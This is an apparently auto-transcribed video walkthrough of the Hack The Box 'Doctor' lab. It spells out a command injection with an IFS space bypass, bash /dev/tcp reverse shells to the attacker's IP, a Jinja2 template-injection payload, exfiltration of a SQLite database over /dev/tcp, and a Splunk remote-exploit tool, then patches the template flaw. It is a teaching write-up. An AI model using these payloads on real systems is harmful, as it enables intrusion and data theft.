 what's going on youtube this is ipsec can we do a doctor from hack the box which was an easy likes machine so i did this machine blind this is a live run of it and the funny thing is i actually did the user piece a unintended way there is a piece of the box where if you put an ip address and a thing it does a curl back against you and you can actually exploit that curl quest the antenna way is through a different field doing service side template injection which we will cover and also going to go into a lot of blue teaming aspects of ssti and how to patch it and where the vulnerability actually is but once you get a user on the box you can find the password to the sean user through the log files because he attempted to put the password in a login field and that got committed to a log file so you find the password of the sean user which grants you access to the splunk daemon that's running on the box and it's a vulnerable version so you can just exploit that to get system on the box so with all that being said let's jump in as always you start with the nmap so dash sc for default scripts sv enumerate versions o a output all formats put in the nmap directory if the directory existed so we create that directory the file name is doctor and then the ip address is 10 209 and i'm also going to add the v flag so it shows me open ports as it finds it just so i have to wait around for my nmap scan we do have a port 22 and 80 open as well as 8089 right off the bat so i'm gonna go to 10 10 10 209 and we see it is a web page um doesn't have the script scan yet so i'm just going to check a few files like robots.txt we can try index.php doesn't exist html and the reason why i tried index.php because it would just tell me if it's like a php website so now we can do a go buster so we have something running in the background so go buster dir mode http 10 10 10 209 word list opt sec list discovery web content then raft small words uh dash o and we'll just say go buster dot out uh probably refsmallwords.txt there we go and mapscan is finished so let's go take a look at it if i put the correct ip here uh if i can type that would be amazing there we go so nmap and then doctor.nmap and we have three ports open um ssh on port 22 http which is running apache on port 80. it doesn't look like anything interesting from the scripts we also have 8089 which is splunk d httpd so it is a splunk service so let's go take a look at https 10 10 10 209 8089 accept this certificate um actually let's view the certificate does this give us a host name uh it doesn't look like we have any type of host name so accept the risk and continue and we just have some basic splunk stuff uh we need credentials there but let's take a look at the website uh go buster is running let me double check i did that i did so while we look at this what are we looking for i'm just scrolling down to see anything going to all these pages i'm just looking at the bottom left and everything is just index.html so nothing is going anywhere i see two comments nothing's there um there looks like there is dead links like this little icon here so i'm going to uh press f12 look at the network tab reload the page and let's see if it tells us what things had for afford the main thing i was looking for if it was going to a different domain or something but it doesn't look like that's the case so going over to services we go back to this page there is an email address info at doctors.htb and just clicking around every page looks like it is the same if we go to contact it is the same i'm going to try going to the virtual host doctors.htb so i'm going to do sudo vi etsy host like say 10 10 10 209 doctors.htb and let's check if this is a different page so doctors.htb and we get a login so email let's try admin at localhost probably.com or something and for the payload uh or one equals one and let's see can i unmask this quickly so you can see what i'm doing i probably should just send this over to burp suite uh tight password let's get rid of that so you can see what the payload i sent was but i am going to send this over to burp suite uh go to proxy tab intercept is on log in and let's see i'm looking at the bytes four six seven seven let's get rid of the sql injection attempt 4677 so nothing too interesting i'm going to copy this to a file and we're going to go to doctor and this will be login.request and the reason why i'm doing this is just so i can poke at other things and have something running in the background i'm a huge fan of always trying to do as much like simultaneously as i can so let's see batch i think that will run it without asking me any questions and yep so it looks like sql map is going off on this so let's check the forgotten password is this going to give us a username so let's see how do we reset passwords looks like it is just going to be email so admin at localhost.com what do you say there is no account valid with that email you must register first so let's see doctors.htb uh let's see info doctors.htb that was the address on the webpage so we don't know um the email let's see or one equals one we can do a sql injection here um wait oh okay it said invalid email address i'm guessing that's because we had a space so yeah that was because we had space there so once the sql injection here finishes which it did i'm gonna send this one to sql map so let's go here go to burp suite proxy we can drop this reset pass save see okay this is gonna be our csrf token so that's gonna make it a pain for sql map um where you may revisit that one later but there is a register function so i'm just going to do ipsec root ipsec dot rocks password password sign up root password uh it has a time limit of 20 minutes okay logging in okay test test let's go to account i'm going to change this to see if there's like any type of cross-site scripting here so if my name became bold right there i would know there's probably cross-site scripting so let's do a new message um click the link 14 what is my ip i am 14 4 0 nc lvmp 80 10 10 14 4 post and we get something uh there is the user agent of curl so curl is running on the back end so let's see um make dirt dub dub dub cdw uh let's do echo please subscribe to test pseudo python 3 http server port 80. we forgot the dash m so right now i want to see if i can make this curl request save something so let's do 10 10 14 4. and i called the file test i believe so slash test dash o for www.html test post we got it let's go to uh doctors.htb test so it doesn't look like that took let's see new message let's put these in quotes and the reason why i'm trying like this type of command injection is because the user agent was curl if the user agent was like python request i probably wouldn't do something but because the user agent is um a linux program i know they're calling bash to execute this somehow so let's see um my thought is the code is like um os dot p open and then the content which is this so or maybe curl content so this is what i'm trying to inject into in my mind so one thing we can probably do is put this in the url so we can say who am i and we'll see how this behaves so i'm going to post this message and let's go back to here and we got web so because this says web and not like the um command injection who am i i know we just executed code so now we can play with this the easiest thing to do now is probably go to brip suite intercept it and then play in this repeater tab i hit the windows key and l to send that to the left side windows key l will send this to the left side there we go so now i should be able to just um quickly run things oh wait i want sweet there we go content this is going to be http test like omi like that um what see it had a time limit of 20 minutes did that time limit fail let's go back to proxy intercept off no it has not so 10 10 14 4 who am i intercept on post forward okay let's go to http history and we want to do press new okay so now we want to try to get command execution this way so i'm going to try echo test we probably need to do url encoding so plus and that doesn't work see the next thing i do is bracket expansion and that doesn't work so all i did was echo test and how that works is bash will just automatically expand um if i do it without that command not found so it replaces all commas with spaces uh the ifs variable by default is also a space so we may be able to do it this way and when we use the ifs variable we have to use quotes around things so let's try echo ifs test and the reason why is because quote is an invalid character for a variable so putting this quote here invalidates that we could also put like brackets around it but if we do that bracket is kind of a more special character than quote so that's why i chose to use a quote so let's see if we get page test it doesn't look like we do let's try single quotes and that works so quotes if i put this in url encoding maybe it will work no so quotes are always a suspicious thing uh we can try putting that in uh brackets and seeing if it works this way so ifs and bracket no doesn't work um i don't think it's parentheses yeah so we need to put this and single quotes awesome so now let's uh see if we can execute code so let's do echo dash n and we'll do bash dash c bash dash i dev tcp 10 10 14 4 port 9001 zero at and one and this is just a bash reverse shell one liner so i'm going to base64 encode it dash w0 will break the line wrapping which i don't think i have to do here so it's the same either way but we can copy this and now we can paste and then do let's see we got quotes ifs and how we gonna break the pipe i guess pipe probably is a fine thing because that's an invalid character so ifs base oh echo okay so that may work let's see got that base64-d will it work in quotes it doesn't but we can do it like this can we put the arguments in quotes we can so i'm always just testing everything um on my local system before i run it dash d so this now should get a page that is this bash reverse shell one liner and it does not ifs ifs bash probably should listen on 9001 just in case it's not making a request or a server but i think these pipes are bad characters um i can get rid of these ifs because i don't think we need spaces before and after the pipe but yeah i think this pipe is breaking our code so what we have to do is drop a file to the disk and then we can um execute it so what i'm going to do is we'll do which curl to see if curl is on the box and we've got to put this in quotes and then replace the space with ifs um oh i see redirect here shoot let's go back a few times because i think what happened was maybe my session died why refresh yeah it wants me to log in so let's register a new account um ipsec root password password then we're going to have to get a new cookie so if i get my target my proxy we go here we can probably just grab this session and replace the session or repeater okay no longer redirecting but we don't have a shell so let's go back here and we want to do the which ifs curl and it tried to get user been curl so we know curl is on the box so now i can do curl ifs dash o for out file ifs uh we want to save it to probably verb www.html test and then the url which is going to be http 101014.4 slash test and i think we created this file already so if i go into dub dub dub cat test it says please subscribe uh let's end that quote send we download a test and we also got slash so let's go to here 10 10 10 209 test and we confirmed we have the file um we probably could have written to like slash temp because we don't actually have to see the file here but um writing to the web directory is always easiest so now i can edit the please subscribe and we just put a reverse shell here so bash dash i um i think that dev tcp 10 10 14 4 9 000 1 0 and 1 like that host this so now we can do this to download test so this can be download and now we just have to execute it so instead of this curl we just say bash and then the file this is a pretty tough easy box now that i think about it bypassing that encoding is not trivial there we go got a shell so now let's do python 3 dash c import pty pty dot spawn bin bash and then stty or all minus echo fg so now i just have a proper tty i'm also going to export term is equal to x term so i can clear the screen and what i'm also going to do we'll go back here and see lvnp 9001 i always like getting a backup shell especially when something's going to erase my session in like 20 minutes or probably 10 minutes now so if i screw up this session i have a backup so let's see if we go into blog let's see flask blog um site.db so sqlite3site.db site.db.dump i just want to see like the saved users and passwords so sqlite not three not found that's annoying uh we can save the file so let's do nc lvmp 9001 to a file we'll call this um site.db and we can cat site.db pipe it over to devtcp 1010144 9001 that has been saved so now i can do sqlite3 site.db.dump and we can see the database so here's all the pages we are doing um here is our password and we got an admin user and a hash uh this is a bcrypt hash which is going to take forever to crack so chances are we don't have to crack it but again with a habit of always running something in the background that's why i'm gonna do it so v hashes doctor paste and then hashcat dash dash example hashes less decrypt it is mode 3200 so hashcat dash m 3200 hashes doctor opt word list rocky.text so we will just let this run i think there's going to be something that about like um improving the performance and i'm going to do that with this one because bcrypt takes forever um maybe it won't tell me how do we get the flag uh maximum rules oh well we'll just let this go in the background so now can i send this to do i have that yeah just send that away to a different pane uh there we go let's maximize this window so what do i want to do i want to run lin p's so opt uh privilege escalation script awesome sweet lin pease let's cp lendp's to htb doctor dub dub dub go into that directory python3 dash m http server and i'm just going to go in device a gem out of habit 10 10 14 4 8 000 linps.sh pipe it to bash and that should be running and while that runs i guess we can do a backup shell so python3 dash c import pty pty.spawn then bash st2y raw minus echo export term is equal to x term what gotta be capital there we go uh lynn p's is still running so let's go home there is webb and sean if i go into sean's directory there is user.txt and only sean can read it so we have to get to that sean user um we can do find slash deskuser sean to devgnol i'm also going to do dash ls so this shouldn't show me files owned by sean lynn p's is still running and there's really not that many files earned by sean let's see go back to lin p's it's going over set uid binaries see is there anything interesting there is the pseudo-binary so we could probably do the um pseudo exploit i don't know exactly what that's saying it looks like he's executing what np's let's just start going down the list cpu info is this telling me what os it is shell say sql alchemy database it is vmware aslr is enabled see see truth oh god here's my uh reverse shell that sticks out apache oh we may want to go into like the splunk config and see if we can get a password out of there i forgot splunk was running cron jobs [Music] system path let's see system d timers that's standard let's see d active ports so pseudo dash l nothing no gdb users and groups there is that sean user mysql not found apache see ersync ssh root can log in nothing too interesting there there because we don't have roots password so much information to go through okay we're near the bottom so let's grab interesting files so we can go back to this point c set gid let's see we can look at this so doesn't look like anything's interesting there capabilities i don't know why like is lib32 there oh okay weird directory names but i don't think it's that interesting sh files that's our user uh we have splunk forwarder passwd uh permission denied who can read that probably only a root yep only root can read that uh there is a bash history for sean i thought we saw that it was mapped to devnet yep so that's not too interesting readable files to root and readable by me but not world so it looks like we can wait are we for the adm group we are so we can read logs um that's different and that's not a standard log uh let's see cd for our log apache2 sweet so let's go cat backup what is that okay let's see awk print one two three four five six so if i do awk print six seven because i can't count we get all the pages sort them unique c and then we can sort dash n so this is showing us all the urls hit in this backup log dot get oh there's a password and this reset password thing or wait reset password that is a post request is that also a get request let's see real quick uh let's go to doctors we can log out uh forgot password see prep suite let's go to proxy intercept so that is a post okay i'm just uh nitpicking right now um you should never see on login forums a uh password inside of a get request they should always be post so that's what i was testing here and i don't think that accepts that um also reset password and putting a password in for the email is weird but let's try this um s u dash paste it we don't have anything su sean okay so now we have access to sean so let's do a find slash dash user sean dash readable to devnl um let's not do dash readable let's just do everything owned by sean we may want to get rid of grab v proc and run so there's a temp a home sis let's get rid of sis sis okay there's this home directory oh pretty much only home uh i thought i saw a cookie somewhere herman sean or pulse i think this is related to sound if i remember correctly so there's nothing interesting there that's not like a chrome browser a firefox or something that would have good cookies uh the splunk port did have authentication so let's try 8089 and let's go turn intercept off this was https and get rid of burp suite there we go let's go to services sean guitar one two three four five uh what was the password um grab i password backup only web can read it funny uh there we go guitar one two three guitar one two three so we can log in and read this so splunk is version 805. so let's do search point splunk and we don't have anything um search point dash u to update whoops uh it did that without root i wonder if it has like pseudo built in huh weird so while that runs let's do um splunk rce to see if we have anything that affects version eight and i'm just going to go to tools we can make this bigger anytime whoa too big there we go let's do past year local private for splunk d so let's see we can download this get clone let's go into splunk whisperer uh the python version and i want the remote let's try remote first um let's see host port lhost okay so host 10 10 10 209 port 8089 l host 10 10 14 4 l port we'll say 9001 username sean password guitar123 uh payload as i was typing this i was like oh we could just use that shell script that's in vera dub dub dub which we may do later uh deb tcp 10 10 14 4. we'll do 9002 so if that fails we'll probably just do that one script that was in dub dub dub so sudo nc lvmp 9002 so let's try running this um fail depress i have two eights authenticating and we got a shell but i forgot zero at and one and there we go we have a root shell on doctor so now i can go into root and get root.text so that'll be the box hope you enjoyed it apologies for the sloppy cut after recording the video i talked to egotistical the creator of this box and found out that whole gaining command execution through the curl was just a rabbit hole that he didn't intend to be vulnerable so we did the box through the unintended way he said the intended way is through server-side template injection so that's what we're going to be showing here um we have to go all the way back to the very first foothold so i'm just going to clean up my tabs and we'll go to doctors.hdb and register an account so the username would do ipsec root password password and now we can log in and the intended way is doing server side template injection so before when we were trying to like xss or cross-site scripting in here um it wasn't cross-site scripting it is ssti server-side template injection so nothing worked there if i do new message and or actually um we're supposed to view the source and we see a comment here archives still under beta testing and there is a slash archive so if we go to slash archive we get a blank page but looking at this source we get the titles of the post so if i go and create a new post with a templating attack so let's do oneplus one and do post uh we put something in the content and then we refresh archive we get two we don't get the title which is the um one plus one so we verified we can do some type of template injection if this was like a ctf and i was timed i'd probably go to opt and payload all the things if i have it here i do and then i'd grab for like a class dot like this and this would find a bunch of sstis that it could try but if we want to learn what to do uh i'd probably go google hack tricks and then ssti and if we go to this page there's probably a lot of good information um when you first get server side template injection you have to identify um what language it is so this is giving you like um right here like kind of a pathway of different teplaning languages so we could try a comment b so a let's try that a new message um see a comment b like that right yes test and we go here it now prints this i'm guessing um the templining language smartie this is probably a comment which does nothing so you probably should see just a b if this was the smarty language we can try seven times seven so let's go here new message seven times seven test refresh archive we get 49. so we go up here and we can try seven times seven with a single quote and we can see what the behavior of this is so seven or if we gotta do two seven times like the ascii character seven and because this is python um it's probably gonna print seven seven times so if we print this it does so we took the string seven not the integer the ascro axe uh ascii and then multiplied it by seven and python prints out that string seven times so we know it is um either ginger 2 or twig if we search this page for like ginger 2 we can go and find basic things this is talking about it there's the template format reading remote files remote code execution sounds awesome so let's try this the number 396 will depend varying on the application okay so this 396 is probably the um location of os and the subclasses let's just try it this way so if we go here new message paste and we want to do a reverse shell so bash dash c bash dash i dev tcp 10 10 14 4 9001 uh we need to zero at and one like that and on our terminal listener 9001 post and if we go to archives it's now taking a while to load because it sent us a shell so that is the server-side template injection yet again we're going to do another sloppy cut because i want to poke at the actual vulnerabilities of this box to see exactly how they exist so i'm going to um a reverse shell real quick let's just uh go into splunk whisperer and i'm gonna get it as root because that will be the easiest thing to do so we're in root i just want to go dot ssh maker slash root dot ssh go in that directory and let's do ssh key gen f doctor no passphrase cat doctor dot pub and we'll copy this into doctor so echo dash n paste to authorized keys [Music] and i probably need to chmod 700 authorized keys and now chmod 600 doctor root at 10 10 10 209. except oh it did not work what let's do chmod 600. no i can't spell there we go so now we have a root shell through ssh so we have a really good dty um i'm gonna go here it's in home web blog home web blog so let's look at this the very first thing i want to do is look at this curl thing so i'm gonna look at curl and it's in post forms so if we do post forms dot pi uh it's not there so let's see validate content okay so here's where it's doing the curl so it's looking for http then it's generating a random file name here and it's downloading what's at the url it found to the random file and then it's looking in that file and then comparing against a blacklist and if we look at what blacklist is it is all these strings so it's preventing against like cross-site scripting attacks so i guess this was just supposed to be a rabbit hole and he didn't intend for the code execution to happen here and the reason why we couldn't do the bracket expansion i think is probably because there were brackets around this url it's either that or what we're doing got translated too early and then put spaces in this argument and then made it an invalid url i'm not exactly sure what went on why we couldn't do this method but yeah so we got code execution just by this url and that's what led to the unintended vulnerability let's look at the ssti so uh what we want to do is find a route so kind of how um i forget what the model is called but maybe mvc model view controller and i say that because i see models.pi here but it's just like a web technology we need to find a route file and that route's going to redirect all the pages so i'm going to do find dot grep route and we can see main route stop pi let's take a look at this so v main routes dot pi and we can see all the pages so here is slash home and here's the function it's going to render the template home.html and send it these variables feed it's doing slash archive and this is different it's passing it to render template string and post.title is a field we control so we have access to the actual um injection point and the way you would hurt in this is do parameterized queries just like it did it here i don't think rendered template string offers the ability to do like um post is equal to purse.title whoops and then do plus post i don't think it offers that ability so we'd have to convert this into a um template so if we wanted to hurt in this what we would do is go into templates and probably vi archive.html and we'd say channel title archive slash title and then we need to do a loop so we can do four post and post and if first author is the current user and this was just here to prevent you from uh seeing other people's stuff if we went into main whoops i'm in templates now if we go here um that's this piece right here so maybe i should copy this and we will go back to editing so where is archive.html this may be the better way to do it i wish i had vim and not this just vi uh i think that's eight yes it is eight okay so that's what we have and um this loop is these two things and what we do is item title and post dot title and we can do slash title slash item to close it out uh do we need channel hold on um item title i think that's what we need um i may have screwed up some of the syntax but it shouldn't break anything may just display a little bit differently on the page um do i have what slash archive looks like i don't proxy error what title archive okay so i think this would harden it and the other thing we do is we have to go into main and we can copy routes to routes.pi dot back and we edit this to change how this works so if we say first oops one two three four one two three four i don't know why eight is the default tab there should be four but post query order by and then i'm looking up here so this will be first dot date posted ascending like that and then we return this and archive dot html we probably should put xml for that but equal pers current user equals current user so now because we are putting the variables and these parameters statements um a templating language should be smart enough to uh know this could be user input and not to render it as a template because this is the template this the variables how it was before combined the two and that's why we had the vulnerability so now is the moment of truth where we rerun this code and find out um it doesn't work and i don't know what to do so let's do psja having grep for web um let's kill this run dot sh so this is going to be uh 916. i'm just gonna kill the parent uh actually i won't kill a parent first we'll just kill that uh looks good if i go here we get service unavailable so i'm going to rerun this and this should start up the web server and we don't have it works um inconsistent use of tabs and spaces the infamous python issues uh v routes so this is really just a tab there we go as i was saying i don't know what why they're doing eight spaces the answer is they're not doing eight spaces they're doing a tab run it oh my god it did not air uh archive isn't returning that what i expect though um no test named current user uh let's see author oh that may be fine um that's a side effect of before it didn't have any authentication check and now it still doesn't have authentication check but i'm doing a variable of current user and we're not logged into the application so it's airing and i control seed gosh darn it um let's just run this web server as root what's the worst thing that can happen home hdb doctor a home ipsec hdb doctor sh-i doctor root at 10 10 10 209 run the web server su web let's just run the web server as web now uh addresses are already in use so it looks like my control c did not kill web.pi it didn't so let's just try this let's go to um sign up ipsec root.rocks password password sign up new message let's just make sure this works so if i go to archive uh something went wrong and i no longer have access to the um standard out so i don't see the error message so let's kill it kill um this is well much higher pid 15807 okay run see none type has no attribute driver name what did i screw up so this is why i'm not a curator let's see post equal post dot query order by first dot date underscore posted ascending i think that's right and then render template archive.html so let's see if we just do this we'll have to restart so let's go templates um let's see archive web can still read it so its owner doesn't matter stop back that box okay we're now in baseball terminology uh let's see for post and post author post title so all i want to do is return this page so we're not gonna do any variables um let's just do one plus one so we should get two okay so ps ef grab web uh we can grab run one five seven nine three l so we can i wonder if i can just do p kill run dot pi no um i don't want to do python 3 so let's just kill that run it again archive new attribute driver name so our issue is somewhere in the route or actually um maybe we don't have an account so if i do ipsec uh let's go to login so rootydipsic.box password what 500 that's new um if we go to home session is unavailable because no secret key was set set the secret key to applicate i guess i'm not running the application correctly um what's blog.sh okay so blog.sh is setting the secret key and then running it so let's run this okay there we go so i think it's a combination let's see do i still exist yeah i don't no luck so let's create my name ipsec root.racks password password login and then if we go to slash archive we get nothing uh we get two actually so everything's working as expected uh we went to archive it rendered archive.html and after that it [Music] worked so let's move archive dot html.bulk to archive.html and then let's go into our main and edit our routes because we commented something right here okay so that code is back so if we look at templates archive.html we should be able to get post.title and it's going to be nothing it may actually error again because that sequel doesn't exist so if we look at it um no test name current user i'm logged in though aren't i i am logged in uh b routes current user um maybe if i do log in required then current user will be there it's weird so if person post purse.author is current underscore user so let's just say author is equal to current user and enter templates we can say if pers author is author no test named author we're posting that i wonder if i can just get rid of this author that's giving me the trouble because we don't have any other users on this so we don't have to fix that it's just bothering me now stop pi post equals post author is current user so if i go in home.html let's look at what this looks like is it current user or author if post author is equal to current user okay so let's mimic how they did it we did so now let's go to archive and first author is equal to current user run it refresh no testing we're getting rid of that i am done debugging this piece i wonder if i just couldn't put it in how i had this for but that piece is done so for post and post okay run it refresh there we go we get a page and nothing's there this is exactly what we expect so let's go to new message test test we go to archive item test okay so now the moment of truth did we fix the ssti this way so we go to archive view source and it's no longer executing code so for this long piece part of the video what we showed is as long as you pass the variables in these parameters you're safe but if you don't do that then that's where the ssti comes from so hope you guys enjoyed the video take care and i will see you all next week